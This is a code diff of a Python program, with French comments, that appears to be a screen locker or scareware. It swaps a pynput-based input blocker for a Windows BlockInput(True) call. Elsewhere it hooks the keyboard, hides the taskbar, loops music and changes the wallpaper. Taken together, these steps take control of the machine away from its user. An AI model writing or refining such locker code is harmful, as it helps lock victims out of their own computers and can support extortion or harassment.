@@ -198,16 +198,8 @@ def play_music_loop():
         pygame.time.Clock().tick(10)
 
 # -------------------- Fonctions de verrouillage --------------------
-def lock_input():
-    def block_key(key): return False
-    def block_mouse(*args): return False
-
-    kb_listener = keyboard.Listener(on_press=block_key)
-    ms_listener = mouse.Listener(on_move=block_mouse, on_click=block_mouse, on_scroll=block_mouse)
-    kb_listener.start()
-    ms_listener.start()
-    kb_listener.join()
-    ms_listener.join()
+def block_input():
+    ctypes.windll.user32.BlockInput(True)
 
 def keyboard_hook():
     pressed_keys = set()
@@ -238,7 +230,7 @@ def main():
 
     listener = keyboard_hook()
     hide_taskbar()
-    threading.Thread(target=lock_input, daemon=True).start()
+    threading.Thread(target=block_input, daemon=True).start()
     threading.Thread(target=play_music_loop, daemon=True).start()
 
     set_wallpaper("wallpaper.jpeg")
